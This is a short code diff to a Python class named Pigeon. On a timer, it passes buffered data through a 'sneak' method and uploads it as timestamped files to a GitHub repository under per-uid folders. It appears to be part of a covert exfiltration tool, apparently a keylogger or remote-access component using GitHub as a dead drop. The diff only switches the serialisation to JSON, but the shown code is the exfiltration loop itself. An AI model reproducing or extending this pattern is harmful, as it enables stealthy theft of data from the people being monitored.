@@ -1,6 +1,6 @@
 from config import PARAM, METHODS, RUNNING
 from github import Github, Repository, ContentFile, UnknownObjectException
-from json import loads
+from json import loads, dumps
 from key import GIT_API_KEY
 from threading import Thread, Lock
 from time import sleep, strftime
@@ -56,7 +56,7 @@ class Pigeon:
         while RUNNING.is_set():
             sleep(Pigeon.__interval)
             if Pigeon.__bufferLock.acquire(blocking=False):
-                info = METHODS["sneak"](str(Pigeon.__buffer))
+                info = METHODS["sneak"](dumps(Pigeon.__buffer))
                 message: str = strftime("%Y-%m-%d %H:%M")
                 _, _ = Pigeon.__repo.create_file(
                     "{}/{}".format(Pigeon.__uid, message),
